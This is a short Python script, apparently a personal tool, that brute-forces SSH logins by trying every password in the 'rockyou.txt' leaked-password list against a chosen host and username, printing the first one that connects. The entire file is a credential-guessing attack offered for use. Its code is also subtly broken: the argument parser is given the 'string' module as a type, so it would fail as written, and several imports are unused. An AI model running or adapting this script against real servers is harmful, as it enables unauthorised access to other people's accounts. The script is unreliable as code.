from logging import exception
from socket import timeout
import argparse
import string
from pwn import *
import paramiko

parser = argparse.ArgumentParser(description="[*] Use : python3 ssh-brute-forcing.py <host> <user>")
parser.add_argument('--host', type=string)
parser.add_argument('--user', type=string)

args = parser.parse_args()
host = args.host
username = args.user


with open("rockyou.txt", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            response = ssh(host=host, username=username, password=password, timeout=1)
            if response.connected():
                print(f"The password {password} is valid!")
                response.close()
                break
        except:
            print("The data assigned for connection is incorrect!")
        

        
